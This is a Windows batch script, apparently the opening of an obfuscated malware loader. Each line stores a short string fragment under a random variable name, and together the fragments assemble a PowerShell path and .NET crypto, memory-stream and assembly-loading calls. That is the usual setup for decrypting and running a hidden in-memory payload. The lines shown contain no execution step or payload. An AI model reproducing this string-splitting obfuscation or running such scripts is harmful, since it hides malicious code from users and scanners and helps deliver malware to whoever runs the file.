@echo off
set "yXPPcwFxfL=rS"
set "JAXsQXNtBE=s\"
set "IaDrVpaiWG=co"
set "MpDMMfZfGP=Po"
set "TvHzCEKWtb=st"
set "mzPtoVuoaC=xe"
set "XZFLRCvUKR=32"
set "gLMOXLtgqh=nd"
set "yzxXVtJvbl=we"
set "iEWtZgUEiD=rs"
set "emWxsPkgDv=.e"
set "jRVssPzNKq=\v"
set "hCejWscxrK=he"
set "BUhszUGHQh=y "
set "jRjnUxzGnP=Wi"
set "oQUaAUPVIa=do"
set "YZqpkYninu=he"
set "fEgnTSYlKS=ow"
set "UINNDQkkMe=we"
set "DcXrjOHXJB=0\"
set "znVvfFNuXZ=em"
set "UKpSgAcyYD=ll"
set "rmdquOePmU= /"
set "jQlCutcIwR=ws"
set "pDimDbkSax=Sy"
set "zBaURUsxCF=1."
set "thzCCgdYXv=po"
set "mRZzfbIMgX=in"
set "RuAhgeEawQ=ll"
set "PXHwbOjwbJ= C"
set "QFjTflxEbZ=py"
set "MXHXimCXHI=:\"
set "HflmYoTxQl=\W"
set "SfydAbMZuN=cd"
set "yRwIweDnHp= %~dp0"
set "EwwLOZkTnr=join"
set "wlpnUFQQoG='dqR"
set "FmLoNhXlma=; };"
set "hHdSOBFYhz=;$cL"
set "bAfLNYnGOJ=raph"
set "WzexzcOEgR=ay()"
set "ikwzklQvlj=lit("
set "zEPsOgWLQw=Conv"
set "uBVUQWotIV=Yi);"
set "FKOROVqeVF=m.IO"
set "OwHGOiVdoQ=Disp"
set "CMtoFfDHYb=[Sys"
set "NJEKlynpNX=embl"
set "IbezHTGnUD=ose("
set "CuJJeJsOFR=-1.."
set "OEmIGLrnpV=.Mem"
set "snJiWnEuVW='gni"
set "kJfXjVpixO=-Obj"
set "BqijXgvICt=::De"
set "AbWCgPsSjI=yste"
set "SyDWSWglte=-joi"
set "mByFRqKvCn=Bmor"
set "wwIclPJwGN=tion"
set "YonXUifUOQ=7;$P"
set "RZGgVdUXVV=New-"
set "cfcLgWAeGm=V = "
set "uGfqvvtxBX=);$n"
set "OTlvPuLDIr=oint"
set "YyBMdLfcqJ=3); "
set "mggLjwroJU=rMhY"
set "fPhdtaXhVW=[Sys"
set "WPHzdYgYVo=hy.A"
set "JQzTmENpwe=cAhe"
set "jcyRmQjiBA=..-1"
set "qJJdLzWfGL= '')"
set "iusAntVBZo=.Cre"
set "fvLklLFpUu=m.IO"
